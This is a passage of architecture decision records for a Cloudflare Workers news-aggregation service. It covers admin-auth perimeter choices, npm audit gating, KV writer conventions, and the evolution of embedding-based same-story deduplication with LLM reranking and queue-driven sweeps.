- If `*.workers.dev` is ever re-enabled, or `CF_ACCESS_AUD` is unset, an attacker could forge the header and bypass admin auth - making the deployment configuration itself a security boundary.
- `documentation/deployment.md` (or the equivalent runbook) MUST document the `workers_dev = false` + `CF_ACCESS_AUD` requirement as a hard precondition for production rollout.
- Future hardening could add JWKS-based verification as defence in depth; revisit if the deployment-configuration boundary fails in practice — concretely, if any post-deploy audit finds `workers_dev = true` on production, or if `CF_ACCESS_AUD` is ever unset in a live `wrangler.toml`.

**Related requirements:** [REQ-OPS-006](../../sdd/observability.md#req-ops-006-integration-deployment-target)

---

### AD26: REQUIREMENTS.md preserved as historical artefact

**Status:** Accepted (2026-05-05)

**Decision:** Do NOT delete `REQUIREMENTS.md` at the project root. Preserve it as a snapshot of the project's original intent. Keep it out of the active doc graph (no cross-references from `documentation/` or `sdd/`) but available at the repo root for historical reference.

**Context:** `REQUIREMENTS.md` at the project root predates the SDD bootstrap and describes an earlier product direction (per-user digest, GitHub-only auth, user-selectable model). The current spec lives in `sdd/`. The file's self-deprecating header acknowledges its stale status but the content is otherwise intact.

**Alternatives considered:**
- **Delete the file.** Loses the snapshot of the project's original direction; git history preserves it but root-level discoverability is gone for newcomers reviewing the repo's evolution.
- **Merge into `sdd/README.md` "Out of Scope" section.** Would dilute the active spec with content that no longer maps to active REQs and forces a structural reframing of historical prose into REQ-ish bullets.
- **Move to `documentation/history/REQUIREMENTS.md`.** Reasonable, but couples a historical snapshot to the active doc tree and risks doc-discipline budget enforcement firing on prose that is intentionally frozen.

**Rationale:** Preserve as a historical artefact of the project's original direction. Deletion would lose the snapshot; merging into `sdd/README.md` "Out of Scope" would dilute the spec with content that no longer maps to active REQs. Keeping it at the repo root, out of the active doc graph, gives newcomers a discoverable artefact while preventing it from contaminating the live spec or doc-discipline checks.

**Consequences:**
- Repo root carries `REQUIREMENTS.md`. Newcomers cloning the repo see it before any subdirectory README; this ADR plus the file's self-deprecating header explain why it lives at the root rather than under `documentation/`.
- The file is NOT auto-updated, NOT linked from indexes, and is excluded from doc-discipline budget checks.
- If a future contributor proposes "cleaning up" the root by deleting `REQUIREMENTS.md`, this ADR is the artefact that records the decision to keep it.

**Related requirements:** none (historical artefact, no active REQ binding).

---

### AD27: All KV writers route through `src/lib/kv/<family>.ts` helpers

**Status:** Accepted (2026-05-05)

**Decision:** Every KV writer for a multi-site key family lives in a dedicated helper file under `src/lib/kv/<family>.ts`. Inline `env.KV.put(...)` or `env.KV.delete(...)` calls from queue handlers, page routes, or other lib files are prohibited when the key family has more than one call site.

**Context:** AD16 introduced the single-writer invariant for `sources:{tag}` only (centralised in `src/lib/sources-cache.ts`). Other KV key families had the same problem: inline writers scattered across multiple files with no shared key-format definition. The affected families at the time of this decision were:

- `scrape_run:{id}:chunks_remaining` - written from both the coordinator and the chunk consumer.
- `discovery_failures:{tag}` - written (put + delete) from `discovery.ts`, `cleanup.ts`, and two admin retry routes.

The `source_health:{url}` family was already centralised in `src/lib/feed-health.ts`, `headlines:{source}:{tag}` in `src/lib/headline-cache.ts`, and rate-limit keys in `src/lib/rate-limit.ts`. Single-call-site readers (e.g., `/api/scrape-status` reading `chunks_remaining`) remain inline - the invariant targets writers and multi-site families only.

**Alternatives considered:**

- **Keep inline writes.** Rejected - same drift class as the `sources:{tag}` race documented in AD16. Multiple writers with no shared key-format definition lead to key-format inconsistencies and make it impossible to audit who mutates a given key family.
- **Abstract via a single `KvRepository<T>` base class.** Rejected - over-abstracts for thin wrappers that each contain a single `kv.put` / `kv.get` / `kv.delete` call. The generic base class buys nothing except indirection.

**Consequences:**

- New KV key families with more than one writer MUST add a `src/lib/kv/<family>.ts` helper before the first writer lands. Code review MUST flag inline `env.KV.put(...)` writes outside `src/lib/kv/` or the pre-existing centralised files; PRs introducing such writes are blocked at review.
- Single-call-site reads (e.g., `scrape-status.ts` reading `chunks_remaining`) may remain inline - the invariant is about multi-site writers, not all KV access.
- Existing files `src/lib/feed-health.ts`, `src/lib/headline-cache.ts`, `src/lib/sources-cache.ts`, and `src/lib/rate-limit.ts` are already compliant; they predate this ADR and serve the same pattern.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence), [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-source-discovery-for-per-tag-feeds)

---

### AD28: npm audit gating split - HIGH advisory, CRITICAL blocking

**Status:** Accepted (2026-05-05)
**Overrides:** spec-finding:CF-048

**Decision:** The CI `npm audit` step runs at TWO levels: HIGH+ as advisory (`continue-on-error: true`), CRITICAL+ as blocking. Do NOT tighten HIGH+ to blocking without first confirming none of the flagged transitives reach the workerd runtime.

**Context:** CF-048 originally proposed tightening the gate to HIGH+ blocking on the production-dep tree (`npm audit --omit=dev --audit-level=high`). The first push that landed the tightening tripped on transitive CVEs in `undici` (pulled by `@astrojs/cloudflare` -> `miniflare` -> `wrangler`). Those transitives are build/dev-time tooling: they ship in `node_modules` but never reach the deployed Workers bundle, which runs on workerd's own fetch implementation. Blocking HIGH would force every PR to wait on Dependabot major-version bumps with breaking-change risk, while delivering no production-runtime risk reduction.

**Alternatives considered:**

- **HIGH+ blocking (the original CF-048 proposal).** Rejected - see Context. Blocks unrelated PRs on transitive build-tool CVEs.
- **HIGH+ blocking with an `npm overrides` allowlist.** Rejected - `npm audit` does not honour package overrides as exclusions; the tooling does not support a clean "ignore these transitives" path.
- **Migrate to a different audit tool (Snyk, Dependabot CLI, etc.).** Rejected for now - npm audit is good enough at the current scale; the dual-level split surfaces the data without over-engineering.

**Rationale:** Workers runtime exposure is what matters; the workerd binary does not include `undici`/`miniflare`/`wrangler`. Surfacing HIGH advisories in CI logs lets operators triage the Dependabot channel without coupling unrelated PR merges to dependency major-version bumps. CRITICAL blocking remains the red line.

**Consequences:**

- HIGH+ npm-audit findings are visible in every CI run but do not block merges. Operators are expected to engage Dependabot PRs as the resolution channel.
- Future CRITICAL CVEs on the production-runtime path WILL block. The threshold is calibrated for runtime exposure, not headline severity.
- Re-tightening HIGH+ to blocking requires either (a) eliminating all transitive build-tool CVEs from the dep tree, OR (b) adopting a tool with finer-grained scoping than `npm audit`.

**Related requirements:** none (operational policy; no REQ binding).

---

### AD29: Cloudflare Access is opt-in additive perimeter; ADMIN_EMAIL gates admin alone

**Status:** Accepted (2026-05-05)
**Supersedes:** AD25
**Overrides:** behavioral-policy:REQ-AUTH-001

**Decision:** The admin gate (`requireAdminSession` in `src/middleware/admin-auth.ts`) treats Cloudflare Access as an opt-in additive perimeter. The Cloudflare Access assertion check (Layer 0) enforces only when `env.CF_ACCESS_AUD` is configured. When `CF_ACCESS_AUD` is unset, Layer 0 is skipped entirely and admin is gated by Layer A (signed-in worker session) plus Layer B (`ADMIN_EMAIL` match) alone. REQ-AUTH-001 AC 8 was rewritten on the same day to describe the new opt-in policy in user-observable terms; this ADR documents the architectural decision behind that AC change.

**Context:** The original three-layer admin gate (CF-001) made `Cf-Access-Jwt-Assertion` mandatory regardless of configuration. Integration deploys without Cloudflare Access bound in front of the worker therefore had admin permanently unreachable: the header is never present, so Layer 1 always rejected with 401 and the operator could not trigger `/api/admin/force-refresh` even when authenticated as the configured `ADMIN_EMAIL`. The same pattern blocks any fork that runs without an Access zone (cost, complexity, or simply not needed at small scale).

**Alternatives considered:**

- **Keep CF Access mandatory.** Rejected - forces a Zero Trust deploy as a prerequisite for force-refresh, even on isolated test/staging instances. Increases setup friction for forks unnecessarily.
- **Hard-coded `DEV_BYPASS_TOKEN` for admin routes.** Rejected - `/api/dev/trigger-scrape` already covers unattended pipeline drives. Threading another bypass into admin middleware forks the policy. One env var (`CF_ACCESS_AUD`) keeps the policy declarative.
- **Require `CF_ACCESS_AUD` even where Access is absent.** Rejected - that conflates "perimeter configured" with "perimeter enforced." Setting the var IS the opt-in signal; requiring it unconditionally breaks environments that legitimately run without Access.

**Rationale:** ADMIN_EMAIL gating + signed-in OAuth session is sufficient as the baseline admin policy. CF Access is a defence-in-depth perimeter that an operator may add when the security profile warrants it (production, larger deployments). Coupling Layer 0 enforcement to `CF_ACCESS_AUD` presence makes the opt-in explicit: setting the var means the operator has bound Access in front and wants the worker to verify the JWT's `aud` claim; clearing the var means the worker should not assume Access is present and should not reject on its absence.

**Consequences:**

- Production deploys with Access MUST set `CF_ACCESS_AUD` AND satisfy AD30 (`*.workers.dev` covered or disabled). Without both, the perimeter is forgeable and admin reduces to ADMIN_EMAIL alone.
- Integration and forks without Access keep `CF_ACCESS_AUD` unset and rely on session + ADMIN_EMAIL.
- Discovery retry endpoints (`/api/admin/discovery/*`) inherit the same gate. Their existing tests pass an opaque assertion value that is now ignored unless `CF_ACCESS_AUD` is set in the test env - no behaviour change there.
- Future review passes that grep the admin path for unconditional Cloudflare Access enforcement should match this ADR's `Overrides:` line and not flag the conditional check as a missing perimeter.

**Related requirements:** REQ-AUTH-001 AC 8.

---

### AD30: `*.workers.dev` perimeter coverage is the operator's responsibility - accepted risk

**Status:** Accepted (2026-05-05)
**Overrides:** workers-dev-exposure:REQ-AUTH-001

**Decision:** Whether the auto-assigned `*.workers.dev` subdomain sits behind Cloudflare Access is the operator's responsibility, not the worker's. The application code does NOT detect the request host or reject `workers.dev` traffic, and reviewers MUST NOT flag this as a perimeter gap. When an operator binds Access on the custom domain they are expected to also bind it on the `*.workers.dev` hostname (or disable that hostname) at the Cloudflare dashboard; failing to do so is an accepted risk owned by the operator.

**Context:** Cloudflare Workers always get a `*.workers.dev` URL in addition to any custom domain. Binding Cloudflare Access to only the custom domain leaves the `*.workers.dev` URL unprotected, bypassing the Access perimeter entirely. Host-detection in the worker code was considered and rejected (AD29 rationale) because the worker correctly trusts the Access edge for JWT validation; the perimeter coverage gap is a deployment configuration concern, not a code concern.

**Consequences:** Operators deploying with `CF_ACCESS_AUD` set MUST also bind Access on the `*.workers.dev` URL or disable it via the Cloudflare dashboard. The deployment runbook in `deployment.md` documents this requirement. The worker does not enforce or detect missing `*.workers.dev` coverage.

**Related requirements:** REQ-AUTH-001 AC 8.

---

### AD31: Google News baseline ownership lives at the coordinator, not in discovery

**Status:** Accepted (2026-05-06)

**Decision:** The per-tag Google News query-RSS baseline is owned by the coordinator (REQ-PIPE-001 AC 6), which synthesises a GN source for every tag in the union of (defaults ∪ curated ∪ discovered KV) on every tick. The discovery LLM (REQ-DISC-001 AC 3) is the legacy producer of the same kind of URL, written once into KV `sources:{tag}` for tags without a first-party feed; its prompt instruction to emit a Google News fallback is now redundant. Discovery LLM should be retrained on first-party sources only in a follow-up pass; until then both paths coexist and the prefer-direct-source pass absorbs any minor overlap.

**Context:** Two independent code paths produce a Google News query-RSS source for the same tag. The discovery-LLM path persists per-tag once at first discovery. The coordinator-baseline path synthesises every tick. A discovered non-curated tag without a first-party feed therefore fans out a GN query twice - once via the KV-cached discovery URL, once via coordinator synthesis. The query strings differ slightly (LLM-crafted phrasing vs. tag-with-dashes-as-spaces), so canonical-URL dedup may miss the overlap; the prefer-direct-source pass cleans up downstream when a direct copy lands in the same tick. This was flagged as an unresolved architectural question in the PR #201 review.

**Alternatives considered:**

- **Discovery owns GN, coordinator skips tags already having a GN entry.** Rejected: discovery runs once at settings save; the KV cache drifts as tag needs change. Coordinator ownership recomputes the baseline every tick from the live tag union.
- **Both paths coexist permanently** - rejected as a stable end-state. The redundant fan-out wastes a small amount of LLM and fetch budget and complicates future debugging when a GN URL turns out to be wrong (which path produced it?).

**Rationale:** The coordinator already owns the per-tick source list; making it the single owner of the GN baseline matches the "coordinator decides which sources fan out" concept. Discovery's job becomes "find first-party feeds for this tag" — a narrower prompt focused on publisher sources. Re-evaluating discovery prompt quality post-narrowing belongs in a future audit, not in this ADR. Keeping the legacy LLM-emitted GN fallback as a transitional state avoids a same-PR rewrite of the discovery prompt and its tests.

**Consequences:**

- REQ-PIPE-001 AC 6 is the canonical home of GN baseline behaviour; reviewers MUST NOT flag the discovery LLM's GN fallback as a missing capability - it is intentionally redundant during the transition.
- A follow-up issue should retrain the discovery LLM prompt on first-party sources only and remove the GN fallback instruction. Until then, the existing KV entries continue to fan out and the coordinator-baseline pass absorbs the duplicate.
- The aggregator-vs-direct dedup pass continues to absorb GN-vs-direct overlap as it does today; no new behaviour is required of it.

**Related requirements:** REQ-PIPE-001 AC 6, REQ-DISC-001 AC 3.

---

### AD32: Same-story dedup uses Workers AI embeddings + Vectorize, not LLM finalize call

**Status:** Accepted (2026-05-06)

**Decision:** Same-story dedup is performed by `@cf/baai/bge-base-en-v1.5` embeddings (768-dim cosine) stored in a dedicated Vectorize index. Every new article is embedded inline in the chunk consumer and upserted into the index; the finalize-pass consumer queries the index for each article in a run and folds matches above `DEDUP_COSINE_THRESHOLD` (default 0.85) whose `published_at` is older into the matched older article via `mergeAsAltSource`. The retention sweep dual-deletes from D1 and Vectorize so the index never holds vectors for evicted rows. The previous LLM-based finalize prompt is removed entirely.

**Context:** Production scrape run `01KQZ0A6PKNP56H7B9MP1CWQS8` on 2026-05-06 produced four cards for one news event (Anthropic financial-services AI agents launch) under different headlines. D1 confirmed `finalize_recorded=1` (the LLM finalize ran and emitted `[]`). Two failure modes: (a) the prompt was heavily anti-merge after earlier false-merge incidents, and (b) at ~49-corpus scale gpt-oss-120b could not reliably hold the entire batch in working memory. URL-canonical dedup was working (~87 dupes/tick); the defect was downstream. Independent LLM-rewritten summaries of the same event share almost no token vocabulary (Jaccard ~0.10-0.13), so neither token-Jaccard nor body-Jaccard could catch them.

**Alternatives considered:**

- **Tighten the finalize LLM prompt** - rejected. Already tightened twice; further tightening re-introduces the false-merge failure mode it was guarding against. The 49-article context-scale problem is structural, not a prompt issue.
- **Token-Jaccard fallback** - proven mathematically broken in the previous attempt (PR #205). Same-event Anthropic articles measured Jaccard 0.10-0.13 regardless of threshold tuning; no threshold could separate same-event from different-event without also dropping unrelated topics into the merge bucket.
- **Cross-encoder reranker on top of dense retrieval** - rejected for v1. Cosine threshold alone (0.81-0.91 same-event vs 0.77-0.84 different-event) gave a clean separation on 11 production articles. Adding a reranker doubles per-tick AI spend without evidence of false merges.

**Rationale:** Embeddings capture meaning, not vocabulary. Validation on the production corpus showed 0.85 cleanly separates same-event paraphrases from different-event articles on the same topic. Vectorize is queried by id (the article that was just embedded), so the matcher sees every surviving article in the pool, not just the current scrape tick - closing the cross-tick blind spot the LLM finalize had by construction. Cost shifts from one LLM call per finalize (gpt-oss-120b on ~49 articles) to one embedding call per ingested article (bge-base on 1-100 texts) - substantially cheaper at the per-article rate.

**Consequences:**

- The prior LLM finalize dedup contract was retired on 2026-05-06 and the REQ removed on 2026-05-13 under the no-tombstone rule; the finalize prompt and its parameters are removed from `src/lib/prompts.ts`. The same-story contract now lives in [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract) + [REQ-PIPE-018](../../sdd/generation.md#req-pipe-018-same-story-collapse-mechanics-survivor-selection-and-data-merge).
- The retention sweep (REQ-PIPE-005) MUST dual-delete: D1 row drop plus `VECTORIZE.deleteByIds`. Single-side deletes leak vectors that future articles will match against, producing phantom merges into rows that no longer exist.
- Forks must provision their own Vectorize index (`ai-news-embeddings` for production, `ai-news-embeddings-integration` for the integration env). Index creation is wired into both deploy workflows via `wrangler vectorize create`, idempotent on subsequent deploys.
- The 0.85 threshold is validated against the current corpus and model. Re-validate before relying on it after a model bump or major corpus shift. Operators tune via `DEDUP_COSINE_THRESHOLD` without a code change.
- Vectorize cold-start lag on the first query of a new index (≈30 s) means the first scrape tick after a fresh deploy may produce duplicates; the historical-dedup admin route resolves them on demand.
- Embedding-model drift: bge-base-en-v1.5 is pinned by id in `src/lib/embeddings.ts`. A future Cloudflare catalogue upgrade does not silently change the vector space.

**Related requirements:** [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract), [REQ-PIPE-005](../../sdd/generation.md#req-pipe-005-article-pool-retention-sweep)

---

### AD33: Embed source-text and apply a same-vendor cosine penalty

**Status:** Accepted (2026-05-06)

**Decision:** The dedup embedding input is the raw scraped body excerpt (`source_snippet`) rather than the chunk-consumer's LLM-rewritten paragraphs. A new column `articles.source_snippet` (migration 0012) stores the input alongside each row so re-embeds via the admin backfill route do not require re-scraping. The dedup decision adds a same-vendor cosine penalty: when both candidates' `primary_source_url` resolve to the same eTLD+1, the cosine is reduced by `DEDUP_SAME_VENDOR_PENALTY` (default 0.05) before the threshold gate. The admin backfill route accepts `?reembed=1` to flip every row to `embedding_status='failed'` so the existing batch loop re-embeds the entire corpus against the new input.

**Context:** Integration historical-dedup sweep on 2026-05-06 produced 4 TPs and 4 FPs across 8 verifiable merges (~50% precision). Phase-0 dedup-diag measurements across the 28 cross-pairs of the 8 surviving primaries showed unrelated articles clustering in 0.55-0.71 cosine - the LLM-summary input compresses unrelated stories into a similar WHAT/HOW/IMPACT prose template, leaving the same-event signal buried within the noise floor. 3 of the 4 FPs were same-publisher pairs (WorkOS, Google AI, CrowdStrike) where publisher-style boilerplate inflated the cosine.

**Alternatives considered:**

- **Tighten threshold to 0.90.** Rejected. Same-event different-vendor cosines fall as low as 0.71 with LLM-summary input; raising the threshold trades FP rate for missed cross-vendor TPs. Compressed dynamic range is the underlying problem.
- **Cross-encoder reranker (`@cf/baai/bge-reranker-base`).** Deferred to phase 2. Source-text + same-vendor offset alone is expected to clear the precision target; if 90%+ precision is not reached after re-embed + sweep on integration, the reranker becomes the next gate.
- **Forbid same-vendor merges entirely (binary cliff).** Rejected. Genuine same-publisher dupes exist (e.g., vendor blog post + same vendor's launch announcement). The subtractive penalty preserves real merges at a stricter threshold; a binary cliff loses them.

**Rationale:** Source-text widens the embedding distribution - independent reporting of the same event shares concrete phrases (entity names, numbers, technical terms) that the LLM rewrite paraphrases away. The same-vendor offset is a precise countermeasure for the dominant FP class (publisher-style inflation) without forbidding genuine same-publisher merges; with `0.05` the effective threshold for same-publisher pairs is 0.90, requiring a stronger source-text signal than cross-publisher merges.

**Consequences:**

- Migration 0012 adds the `source_snippet TEXT` column. Historical rows leave it NULL; `buildEmbeddingInput` falls back to `details_json` for those rows so re-embed produces a valid (but less precise) vector.
- `DEDUP_SAME_VENDOR_PENALTY` is exposed as an env var (default 0.05). Setting it to `0` disables the offset for forks that ingest different corpora.
- The chunk-consumer now writes the union of `primary.body_snippet` and each alt's `body_snippet` into `source_snippet` so the embedding sees the widest available source-text surface.
- The historical 1321 production articles (and 124 integration articles) were embedded against the old LLM-summary input. The `?reembed=1` flag re-embeds them against `details_json` (since they have no `source_snippet`).
- True precision improvement compounds as new scrape ticks accumulate `source_snippet` rows. The same-vendor penalty applies immediately to every queried pair regardless of `source_snippet` presence.
- The dedup-diag diagnostic now also reports `adjusted_score` (cosine minus penalty when same-vendor) and `same_vendor_penalty`, so an operator inspecting a pair sees the value the merge decision actually compares.
- The eTLD+1 helper (`src/lib/etld.ts`) is the same-publisher decision; it intentionally avoids the Public Suffix List dependency. If the corpus ingests UK / AU / NZ regional press, swap to PSL.

**Related requirements:** [REQ-PIPE-012](../../sdd/generation.md#req-pipe-012-same-story-matching-policy-variants) AC 2 (same-vendor penalty), [REQ-PIPE-014](../../sdd/generation.md#req-pipe-014-same-story-operator-surfaces) AC 5 (re-embed backfill).

---

### AD34: LLM same-event rerank for borderline cosine pairs

**Status:** Accepted (2026-05-07)

**Decision:** Pairs whose adjusted cosine falls in `[DEDUP_RERANK_FLOOR, DEDUP_COSINE_THRESHOLD)` (default `[0.72, 0.85)`) go to a single binary same-event judgment by the language model. A positive verdict triggers `mergeAsAltSource` (existing-article-wins), a negative or unparseable verdict keeps the pair distinct. Pairs at or above the threshold auto-merge without an LLM call; pairs below the floor stay distinct without an LLM call. A per-invocation rerank cap (default 25) bounds worst-case cost; once hit, additional borderline pairs in the same invocation stay distinct and the cap is logged.

**Context:** First production scrape after AD33 landed (run `01KR14ZGF1SD7YH0Y7DW0ZEJPY`, 2026-05-07) ingested 23 articles with zero alt-source merges. Two of those articles described the same Romania political event under different framings: "Romania PM Ousted in No-Confidence Vote" and "Romania Government Collapses as Far-Right Coalition Forms" - pairwise cosine 0.7499, below the 0.85 auto-merge bar. A separate same-day pair on the Manus / Meta acquisition (April 28) showed similar drift. The 0.85 threshold is correctly tuned: lowering it would re-introduce the false-merges that AD32 was set up to prevent (validation showed distinct same-publisher announcements clustering in 0.77-0.84). The miss is in the borderline band where embeddings alone cannot decide and threshold tuning trades misses 1:1 for false-merges.

**Alternatives considered:**

- **Lower `DEDUP_COSINE_THRESHOLD` to 0.78.** Rejected. The 0.81-0.91 same-event band overlaps with the 0.77-0.84 distinct-same-publisher band; lowering the auto-merge bar to catch the borderline misses re-introduces the false-merge class AD32 was tuned to prevent.
- **Cross-encoder reranker (`@cf/baai/bge-reranker-base`).** Deferred. Same-event identity is a semantic equivalence call; bge-reranker-base was trained for relevance ranking, not event identity. LLM with a one-shot prompt is simpler; reranker is the next gate if cost or latency becomes a problem.
- **Always rerank every match (regardless of cosine).** Rejected. Per-tick cost would scale with the auto-merge band's volume (the dominant case); the borderline band is small and the LLM call only adds value where embeddings alone are inconclusive.

**Rationale:** The LLM judgment is the only signal that distinguishes "same event, different framing" from "same domain, different event" without lowering the auto-merge bar. A conservative-on-failure default (treat parse failure / network error as "different events") preserves the property that no pair is merged on the strength of an unreliable model answer. The per-invocation cap is a hard safety net for bad-day clusters (a feed pushing 100 near-duplicates in one tick) so the rerank pass cannot exhaust the isolate budget.

**Consequences:**

- New env var `DEDUP_RERANK_FLOOR` (default `"0.72"`) is read at runtime by both the per-tick finalize pass and the historical re-run sweep. Setting it to the same value as `DEDUP_COSINE_THRESHOLD` disables rerank without removing the code path.
- New module `src/lib/dedup-rerank.ts` owns the prompt + narrow-JSON parser. The LLM call piggybacks on the existing `runJson` helper so token / cost accounting is unchanged.
- Per-tick cost adds ~2-5 LLM calls in the typical case (small fraction of the existing chunk-pass spend). Worst-case per-call cost is bounded by the rerank cap (default 25 calls).
- Borderline matches require a one-extra D1 read per pair to fetch the existing article's `title` + `source_snippet` for the prompt (the existing finalize SELECT already pulls these for the new article).
- The historical re-run sweep benefits without code changes: re-running the operator-initiated sweep after this decision lands picks up borderline pairs the original ingest missed (Romania, Manus, future cases of the same shape).
- Validation will be cumulative: the dedup-diag diagnostic does not directly surface rerank verdicts, so confirmation comes from observing per-run `rerank_calls` and `rerank_accepts` counters in structured logs across multiple ticks.

**Related requirements:** REQ-PIPE-009, REQ-PIPE-003.

---

### AD35: Operator historical-dedup sweep self-chains via Cloudflare Queue

**Status:** Accepted (2026-05-07)

**Decision:** The operator-triggered historical-dedup sweep is driven by a self-chaining Cloudflare Queue (`DEDUP_SWEEP`) plus a `dedup_runs` audit table. The admin route is a kicker: it inserts the audit row, enqueues one starter message, and returns immediately with a `run_id`. The consumer processes one batch via `runHistoricalDedupBatch`, updates the audit row, and re-enqueues a continuation message until the corpus tail is reached. The operator surface polls `/api/admin/dedup-status?run_id=…` for progress; closing the browser tab does not interrupt the sweep.

**Context:** [REQ-PIPE-014](../../sdd/generation.md#req-pipe-014-same-story-operator-surfaces) AC 1 requires the operator to re-run same-story matching across the entire historical pool on demand. The previous shape ran a `while(true) fetch(/api/admin/historical-dedup, {cursor})` loop in the browser. On 2026-05-06 a production run produced 4 visible duplicates of one story (BTIG/Palo Alto, Anthropic financial-services AI agents) that subsequent dedup runs did not collapse. Even before root-causing the BTIG miss specifically, the architectural fragility was clear: the entire sweep depended on the operator's browser tab staying open for as long as the corpus took to scan. Tab close, network blip, or accidental navigation aborted the sweep mid-corpus and there was no audit trail of how far it got.

**Alternatives considered:**

- **Cloudflare Cron Trigger** - overkill for an operator-triggered, on-demand sweep; cron schedules are discouraged for one-shot work and can't take a `run_id` parameter.
- **Durable Object with `setAlarm`** - viable but adds a new primitive (no DOs in this project today) and storage that isn't queryable from D1 for the operator surface.
- **`ctx.waitUntil` with self-fetch chaining** - bounded by the Worker invocation lifetime (~30s); a multi-thousand-article sweep would not finish in one invocation, and there's no built-in retry or visibility.
- **Queue-driven self-chain** *(chosen)* - reuses an existing primitive (three queues already run in the scrape pipeline), inherits built-in retry and DLQ semantics, and `dedup_runs` gives a queryable progress signal that survives browser refresh.

**Rationale:** The queue primitive is already part of the system's mental model and operational vocabulary; adding a fourth queue is cheaper than introducing a Durable Object. Self-chaining (consumer re-enqueues continuation) is a well-known pattern with predictable failure modes - terminal failure flips the audit row to `'failed'` with the error string. The `dedup_runs` table makes the sweep observable from any admin surface, not just the tab that started it, and the polling endpoint cleanly separates execution (queue) from observability (D1).

**Consequences:**

- New queues `dedup-sweep` (production) and `dedup-sweep-integration` are declared in `wrangler.toml` and provisioned by inline `wrangler queues info ... || wrangler queues create ...` steps in both deploy workflows. A fresh fork's first deploy provisions both without manual setup.
- Migration `0013_dedup_runs.sql` adds the audit table. The consumer's first UPDATE requires the table to exist, so the migration must run before the consumer code deploys. Both deploy workflows enforce this ordering.
- The synchronous body-driven path on `POST /api/admin/historical-dedup` is preserved (when `cursor`/`batch` is in the body) so dev-bypass curl scripts and the existing test suite continue to work without rewriting.
- The browser-driven `while(true)` loop on `/settings` is replaced by a 5-second poll on `/api/admin/dedup-status`; the page can resume mid-sweep on tab reload by reading the persisted `runId` from pipeline state.
- Future sweeps (e.g., re-embed + dedup) can be modelled the same way without re-litigating the shape.

**Related requirements:** [REQ-PIPE-014](../../sdd/generation.md#req-pipe-014-same-story-operator-surfaces) AC 1, [REQ-OPS-008](../../sdd/observability.md#req-ops-008-unified-admin-pipeline-run-trigger-from-the-settings-surface), [REQ-OPS-009](../../sdd/observability.md#req-ops-009-admin-pipeline-run-progress-surface)

---

### AD36: Lower dedup auto-merge threshold to 0.78 and remove the per-batch rerank cap

**Status:** Superseded by AD39 (2026-05-08); rerank-cap removal further refined by AD48 (2026-05-14)

**Supersession note:** The threshold change (0.85 -> 0.78) was reversed by AD39 when the 13-source false-merge cluster on 2026-05-08 showed that dense-theme topics produce independent-event pairs at 0.78-0.86. The current threshold is 0.88 with a 7-day time-window gate. The rerank-cap removal was reintroduced in a different shape: AD42's multi-rerank put a per-self cap of 5 candidates back in the in-tick finalize path, and AD48's batched-call ceiling (RERANK_BATCH_SIZE=15) now bounds the sweep path. AD36's prompt loosening ("same news cycle for the same subject") remains current.

**Decision:** `DEDUP_COSINE_THRESHOLD` drops from `"0.85"` to `"0.78"` and `DEDUP_RERANK_FLOOR` drops from `"0.72"` to `"0.70"` on both production and integration. The per-batch rerank cap (`MAX_RERANKS_PER_BATCH = 4`) is removed from `runHistoricalDedupBatch`; the queue consumer's wall-clock budget bounds the work per message instead. The rerank prompt is loosened from "SAME news event" to "SAME news cycle for the SAME subject" with explicit examples of close follow-on coverage (multiple analyst takes published the same week, multiple security outlets covering the same vulnerability) so genuine same-cycle pairs that are not literally the same announcement still merge.

**Context:** A 2026-05-07 production audit on `news.graymatter.ch` after AD32-AD35 had landed found two clusters that the calibration based on a single Anthropic financial-AI cluster (pairwise cosine 0.81-0.91 - an outlier) had silently left unmerged. A PAN-OS zero-day cluster spanning four security outlets sat at pairwise cosine 0.75-0.78. A Palo Alto Networks valuation-week cluster spanning analyst notes published the same week sat at 0.73-0.80.

Both clusters were entirely below the 0.85 auto-merge bar; the larger valuation cluster also produced six borderline pairs in a single batch, of which only two reached the LLM rerank because the per-batch cap of 4 (a leftover from the synchronous browser-loop era when the operator's tab paid the wall-clock cost) silently dropped the rest. After the manual sweep on prod with the old constants the cluster was still visibly duplicated on the digest surface.

**Alternatives considered:**

- **Keep 0.85 and rely on rerank.** Rejected. 6/8 PAN-OS pairs and most PANW pairs sat below 0.78; the rerank cap dropped the rest. Removing the cap and lowering the floor absorbs same-cycle clusters without unnecessary LLM calls.
- **Keep 0.85 and lower only the rerank floor.** Rejected. Same-cycle pairs at 0.78-0.85 would pay LLM cost when the embedding signal is already strong enough. ~5 unnecessary LLM calls per batch on pairs the model clearly separates.
- **Drop to 0.75.** Rejected. Unrelated articles cluster up to 0.71; boilerplate pushes cosines higher. 0.75 leaves no safety margin. 0.78 sits in the gap between the unrelated upper tail and same-cycle lower tail; the same-vendor penalty handles same-publisher overlap.
- **Keep a higher rerank cap (e.g., 25).** Rejected. The cap was wrong in shape, not number. The 15-minute queue budget already bounds the loop via batch size × topK; a per-batch cap is redundant and silently degrades recall.

**Rationale:** The 0.85 number was tuned against a single outlier cluster (pairwise 0.81-0.91) and never had a population behind it. Real same-cycle clusters at production scale span 0.73-0.80 and the calibration evidence is now broad enough (two distinct subject domains, eight outlets, two clusters) to set a defensible auto-merge bar at 0.78. The rerank cap was a synchronous-loop-era safety belt that quietly degraded recall once the sweep moved to queues; removing it restores the documented behaviour ("rerank every borderline pair") without touching the cost ceiling (the consumer's wall-clock budget already bounds it).

**Consequences:**

- The integration env mirrors the production constants so a fork tuning its own corpus has one place to override (the env var defaults).
- The same-vendor cosine penalty (default 0.05) now lifts the effective same-publisher threshold from 0.78 to 0.83 instead of 0.85 to 0.90; same-publisher pairs still need a stronger signal than cross-publisher pairs but the ceiling is lower in absolute terms.
- The first sweep after this lands will produce a one-shot wave of merges as the existing corpus collapses against the new bar; the `dedup_runs` audit row records the count.
- If false-merges surface in the new band, the lever is the `DEDUP_COSINE_THRESHOLD` env var (no code change). The dedup-diag diagnostic and per-run rerank counters are the observation surfaces.
- The rerank prompt loosening is the smaller knob: a future tightening (back toward "exact same announcement only") is a drop-in env-or-prompt change without revisiting the threshold.

